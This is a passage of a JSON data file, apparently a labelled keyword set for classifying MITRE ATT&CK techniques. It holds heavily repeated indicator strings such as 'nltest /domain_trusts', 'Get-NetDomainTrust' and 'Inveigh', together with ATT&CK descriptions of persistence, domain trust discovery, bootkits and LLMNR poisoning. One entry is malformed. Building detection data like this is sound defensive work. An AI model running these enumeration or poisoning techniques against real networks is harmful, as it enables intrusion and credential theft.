    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
    "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)"
  ],
  "data obfuscation": [
    "In order to evade network level detection, the downloader uses steganography.",
    "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. "
  ],
  "domain trust discovery": [
    "The wormDll32 module attempts to identify servers and domain controllers in the network using NetServerEnum and LDAP queries.",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    "objectClass=trustedDomain ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " nltest /domain_trusts ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetDomainTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    " Get-NetForestTrust ",
    "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)"
  ],
  "email collection": [
    "This module searches the infected system\u2019s files to gather email addresses for information-stealing purposes.",
    "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. "
  ],
  "browser session hijacking": [
    "send a POST response to the C&C server to extract the user\u2019s login credentials. redirect users to fake phishing websites.",
    "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)"
  ],
  "data from removable media": [
    "A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file.",
    "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media."
  ],
  "credentials from password stores-multi": {
    "technique_names": ["data from removable media"],
    "sentances": [""]
  },
  "pre-os boot: bootkit": [
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "bootkit",
    "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code."
  ],
  "boot or logon initialization scripts": [
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "UserInitMprLogonScript",
    "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges."
  ],
  "shared modules": [
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "load additional modules",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    "NTDLL.dll ",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " LoadLibraryExW()",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    " DWriteCreateFactory() ",
    "Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API.(Citation: Wikipedia Windows Library Files)\n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features."
  ],
  "adversary-in-the-middle: llmnr/nbt-ns poisoning and smb relay": [
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    "Inveigh ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " NBNS Spoofing ",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    " poison name services",
    "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)"
  ],
  "external remote services": [
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "VPN and to persist in same sentence ",
    "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)"
  ],
  "proxy: domain fronting": [
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Tor plugin ",
    "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y."
  ],
  "access token manipulation: sid-history injection": [
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
